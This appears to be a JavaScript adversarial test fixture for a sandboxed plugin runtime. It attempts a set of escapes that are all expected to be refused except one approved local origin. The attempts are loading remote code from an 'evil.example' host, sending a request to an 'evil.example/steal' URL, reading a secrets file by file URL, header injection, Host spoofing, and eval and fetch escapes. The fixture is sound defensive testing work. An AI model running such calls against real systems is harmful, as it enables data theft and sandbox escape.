// F00 adversarial fixture: every attempt must be refused except the approved local origin.
export default {
  async probe(req, ctx) {
    const results = {};
    const attempt = async (name, fn) => {
      try { await fn(); results[name] = 'allowed'; }
      catch (e) { results[name] = 'denied: ' + String((e && (e.detail || e.message || e.kind)) || e); }
    };
    await attempt('importOutsidePackage', () => import('../bench/main.js'));
    await attempt('importAbsolutePath', () => import('C:/Windows/win.ini'));
    await attempt('importUrl', () => import('https://evil.example/x.js'));
    await attempt('unapprovedOrigin', () => ctx.$http({ method: 'GET', url: 'https://evil.example/steal' }));
    await attempt('fileUrl', () => ctx.$http({ method: 'GET', url: 'file:///C:/Users/Public/secrets.dat' }));
    await attempt('pathField', () => ctx.$http({ method: 'GET', url: 'https://api.bench.example/x', path: 'C:/Users/Public/secrets.dat' }));
    await attempt('unboundSecret', () => ctx.$http({ method: 'GET', url: 'https://api.bench.example/x',
      credentials: [{ target: { area: 'header', name: 'Authorization' }, parts: [{ literal: 'Bearer ' }, { secret: 'apiKey' }] }] }));
    await attempt('forgedFileHandle', () => ctx.$http({ method: 'POST', url: 'https://api.bench.example/x', body: { kind: 'file', file: 'h-forged-0001' } }));
    await attempt('otherLoopbackPort', () => ctx.$http({ method: 'GET', url: 'http://127.0.0.1:8765/' }));
    await attempt('httpDowngrade', () => ctx.$http({ method: 'GET', url: 'http://api.bench.example/x' }));
    await attempt('urlUserinfo', () => ctx.$http({ method: 'GET', url: 'https://user:pw@api.bench.example/x' }));
    await attempt('headerInjection', () => ctx.$http({ method: 'GET', url: 'https://api.bench.example/x', headers: { 'X-A': 'a\r\nHost: evil' } }));
    await attempt('hostHeader', () => ctx.$http({ method: 'GET', url: 'https://api.bench.example/x', headers: { Host: 'evil.example' } }));
    await attempt('evalGlobal', () => { if (typeof eval === 'function') return eval('1'); throw new Error('eval is ' + typeof eval); });
    await attempt('functionConstructor', () => { const F = (function () {}).constructor; if (typeof F === 'function') return F('return 1')(); throw new Error('constructor is ' + typeof F); });
    await attempt('fetchGlobal', () => { if (typeof fetch === 'function') return fetch('https://evil.example'); throw new Error('fetch is ' + typeof fetch); });
    await attempt('approvedLocalOrigin', () => ctx.$http({ method: 'GET', url: req.localUrl }));
    return results;
  },
};
